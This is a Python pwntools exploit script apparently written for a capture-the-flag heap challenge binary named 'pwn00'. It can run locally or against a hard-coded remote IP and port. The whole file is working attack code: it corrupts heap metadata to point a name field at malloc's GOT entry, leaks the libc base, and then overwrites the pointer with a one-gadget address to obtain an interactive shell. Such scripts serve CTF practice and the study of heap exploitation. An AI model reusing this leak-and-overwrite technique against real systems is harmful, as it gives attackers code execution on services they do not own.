from pwn import *
import ctypes




local = True
if local:
	r = process(['./pwn00'])
	libc = ELF('./libc-2.23.so')
	#context.log_level = 'debug'	
else:
	r = remote('45.76.176.158', 40037)
	


malloc_got_plt = 0x000000000602050

def create_message(receiver,size,content):
	r.sendlineafter('8.Exit\n','1')
	r.sendlineafter('Input receiver\'s name:',receiver)
	r.sendlineafter('Input size:',str(size))
	r.sendafter('Input content:',content)

def create_note(size_name,name,size_content,content):
	r.sendlineafter('8.Exit\n','5')
	r.sendlineafter('Input name\'s size:',str(size_name))
	r.sendafter('Input name:',name)
	r.sendlineafter('Input content\'s size:',str(size_content))
	r.sendafter('Input content:',content)

def edit_message(id,content):
	r.sendlineafter('8.Exit\n','4')
	r.sendafter('Input id:',id)
	r.sendafter('Input content:',content)

def remove_receiver():
	r.sendlineafter('8.Exit\n','3')


def edit_name(name):
	r.sendlineafter('8.Exit\n','6')
	r.sendafter('Input name:',name)


create_message('hocsama',0x60,'content')
remove_receiver()
edit_message('\xc1'*5,'content')
create_note(0x38,'hocsama',0x400,'overflow')
create_note(0xc0-8,'a'*0xa8 + p64(malloc_got_plt) ,0x38,'overflow')
r.sendlineafter('8.Exit\n','7')
r.recvuntil('Name :')
leak_libc = u64(r.recvline().strip().ljust(8,'\x00'))
libc_base = leak_libc - libc.symbols['malloc']
print 'libc : ' + hex(libc_base)

raw_input('Debug')
edit_name(p64(libc_base + 0xcb78a))

r.sendlineafter('8.Exit\n','5')
r.sendlineafter('Input name\'s size:',str(0))
r.interactive()
